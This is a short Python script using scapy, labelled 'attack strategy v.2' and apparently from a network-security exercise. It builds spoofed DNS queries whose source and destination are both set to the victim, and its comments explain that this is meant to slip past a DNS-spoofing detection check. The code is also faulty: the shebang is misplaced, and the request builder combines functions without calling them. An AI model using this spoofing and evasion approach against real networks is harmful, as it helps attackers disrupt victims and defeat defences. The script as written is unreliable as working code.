# Shebang line to indicate which interpreter is to be used by specifiying it's path
#!/usr/bin/env python3

#############################################################################
############################ ATTACK STRATEGY V.2 ############################

#############################################################################
############################### ISSAM MISTO #################################

from scapy.all import *

# In this function, we create the IP packet setting both 
# the source and destination to be the victim.
# We do this to avoid the detection algorithm, which checks if a DNS query
# has more than one answer,and then compares both answers to make sure they're 
# correct. However in this case, the query will only get one answer, and will
# then be replaced by a different query which will also get one answer and so on...
def create_IP_Packet(IP_src_dst):

    IPpacket = IP(src = IP_src_dst , dst = IP_src_dst)
    return IPpacket

# In this function, we create the UDPpacket setting the destination port
# to be 53 which is the local DNS server
def create_UDP_Packet():

    UDPpacket = UDP(dport = 53)
    return UDPpacket

# In this function, we create the DNSpacket with the correct configuration. 
# We set qname to be the requested domain
def create_DNS_Packet(qname):

    DNSpacket = DNS(rd =1 , qdcount = 1, qd = DNSQR( qname = qname , qtype = 255))
    return DNSpacket

# Create the full request
def create_request():

    request = create_IP_Packet/create_UDP_Packet/create_DNS_Packet
    return request